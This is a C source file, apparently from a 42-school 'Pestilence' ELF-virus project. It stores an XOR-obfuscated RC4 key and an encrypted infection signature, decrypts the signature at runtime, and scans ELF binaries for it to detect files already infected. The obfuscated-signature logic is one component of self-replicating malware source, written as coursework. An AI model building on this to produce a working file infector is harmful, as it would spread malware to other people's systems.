/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   signature.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/06 23:04:13 by jainavas          #+#    #+#             */
/*   Updated: 2026/01/09 22:39:53 by jainavas         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/pestilence.h"

static const unsigned char OBFUSCATED_KEY[] = {
    0x76, 0x70, 0x66, 0x66, 0x12, 0x27, 0x31, 0x36, 0x2b, 0x2e, 0x27, 0x2c, 0x21, 0x27, 0x66, 0x66
};
static const size_t KEY_LEN = 16;

static unsigned char ENCRYPTED_SIG[] = {
    0x46, 0x65, 0x35, 0x5c, 0xe7, 0xec, 0xc7, 0x76, 0xab, 0x72, 0x37, 0x4b, 
    0xfc, 0x90, 0x7d, 0x87, 0xbf, 0x13, 0xb5, 0xbe, 0x15, 0x63, 0xbe, 0x37, 
    0xf8, 0x45, 0xd4, 0xad, 0x9e, 0x75, 0xff, 0x1c, 0x4e, 0x67, 0x65, 0x93, 
    0xbb, 0xf5, 0x08, 0x80, 0x1c, 0xbe, 0x2b, 0x6a, 0xad, 0x06, 0xbd, 0x19, 
    0xda, 0x4f, 0x9b
};
static const size_t ENCRYPTED_SIG_LEN = 51;

static void deobfuscate_key(unsigned char *key_out)
{
    for (size_t i = 0; i < KEY_LEN; i++) {
        key_out[i] = OBFUSCATED_KEY[i] ^ 0x42;
    }
}

const char *get_signature(void)
{
    static char signature[MAX_SIGNATURE_LEN] = {0};
    static bool decrypted = false;
    
    if (!decrypted) {
        unsigned char rc4_key[KEY_LEN];
        
        // Desofuscar la clave
        deobfuscate_key(rc4_key);
        
        // Copiar firma cifrada
        memcpy(signature, ENCRYPTED_SIG, ENCRYPTED_SIG_LEN);
        
        // Descifrar con RC4
        rc4_crypt((unsigned char *)signature, ENCRYPTED_SIG_LEN, 
                  rc4_key, KEY_LEN);
        
        signature[ENCRYPTED_SIG_LEN] = '\0';
        decrypted = true;
    }
    
    return signature;
}

bool is_infected(t_elf *elf)
{
    const char *sig = get_signature();
    size_t sig_len = strlen(sig);
    
    for (size_t i = 0; i < elf->size - sig_len; i++) {
        if (memcmp(elf->data + i, sig, sig_len) == 0)
            return true;
    }
    
    return false;
}